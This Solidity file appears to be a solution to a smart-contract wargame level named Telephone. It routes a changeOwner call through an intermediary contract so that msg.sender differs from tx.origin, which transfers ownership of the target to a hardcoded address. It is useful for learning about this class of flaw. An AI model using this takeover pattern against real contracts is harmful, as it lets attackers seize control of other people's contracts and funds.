// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone{
  function changeOwner(address _owner) external  ;
}

contract Sender {
  function callTelephone(address _TelephoneAddress) external {
    address owner = 0x25C0e2687258D2DAc9BBc1D9e9e620fBcd622575;

    ITelephone(_TelephoneAddress).changeOwner(owner);
  }
}

contract Initiator {
  function callSender (address _TelephoneAddress, address _SenderAddress) external {
    Sender mySender = Sender(_SenderAddress);

    mySender.callTelephone(_TelephoneAddress);
  }


}
